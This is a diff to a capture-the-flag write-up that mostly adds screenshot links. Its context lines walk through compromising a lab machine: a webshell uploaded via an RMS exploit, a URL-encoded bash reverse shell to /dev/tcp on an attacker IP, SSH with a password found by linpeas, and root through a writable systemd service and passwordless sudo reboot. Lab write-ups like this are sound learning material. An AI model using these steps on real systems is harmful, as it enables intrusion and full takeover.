@@ -42,6 +42,7 @@ PORT      STATE SERVICE REASON  VERSION
 /rms                  (Status: 301) [Size: 238] [--> http://10.10.251.31:12340/rms/]
 ...
 ```
+![](site.png)
 
 # RMS exploit
 RMS stands for Restaurant Management System
@@ -132,21 +133,33 @@ print("[+] Shell Uploaded. Please check the URL : "+url+"images/reverse-shell.ph
 
  http://10.10.98.202:12340/rms/images/reverse-shell.php?cmd=id
 
+ ![](cmd.png)
+
+
  To get a reverse shell we url encode `bash -i >& /dev/tcp/10.11.40.46/4444 0>&1` and execute it in the webshell
  ```sh
 http://10.10.98.202:12340/rms/images/reverse-shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.40.46%2F4444%200%3E%261
 ```
 No we have a shell as apache. 
+![](shell1.png)
+
 
 # Privilege escaltion to edward
 During enumeration we found another user 'edward' an with linpeas we found a password. Let's try logging in as that user via ssh.
+
+![](password.png)
 ```sh
 ssh edward@10.10.98.202
 ```
 
 Yes!! we have as shell as edward and can read the user flag.
 
-Now we run linpeas again and we find out that we can write to a service. Let's read the file:
+Now we run linpeas again and we find out that we can write to a service. 
+
+![](service1.png)
+
+
+Let's read the file:
 ```sh
 [edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service
 [Unit]
@@ -189,11 +202,15 @@ To change the file we convert the file to base64 and redirect the output to the 
 ```
 
 In order to start the service we need to reboot the machine. During enumeration it was found that `/usr/bin/reboot` can be executed as sudo without password.
+
+![](ssudoreboot.png)
 ```sh
 sudo reboot
 ```
 
 After connecting again via ssh as the user edward we can simply type `bash -p` to get a root shell:
+
+![](root.png)
 
 
 
